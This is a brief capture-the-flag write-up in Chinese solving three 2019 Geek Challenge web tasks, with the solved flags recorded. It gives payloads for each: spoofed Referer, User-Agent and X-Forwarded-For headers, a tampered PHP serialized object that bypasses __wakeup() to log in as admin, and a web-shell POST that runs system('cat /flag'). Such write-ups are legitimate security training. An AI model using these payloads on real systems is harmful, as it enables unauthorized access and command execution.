# Web

## [极客大挑战2019]Http

按照提示一步步添加Header

```
Referer: https://www.Sycsecret.com
User-Agent: Syclover
X-Forwarded-For: 127.0.0.1
```

> flag{8ea3be2a-20b1-4ed2-85ea-e8ac575771aa}

## [极客大挑战2019]PHP

1. /www.zip下载源码
2. 序列化

```php
$a = new Name('admin',100);
$b=serialize($a);
echo $b;
// O:4:"Name":2:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";i:100;}
```
3. 修改序列化内容

```php
// 2 -> 3 : 绕过__wakeup()函数
// 加%00是因为username和password都是私有变量

// O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}
```

> flag{9514e1f0-75ab-48f4-a621-2e517031a8ad}

## [极客大挑战2019]Knife

1. POST Syc=system("cat /flag");

> flag{5703c527-e70a-420e-9ad0-ac5786d1b4a7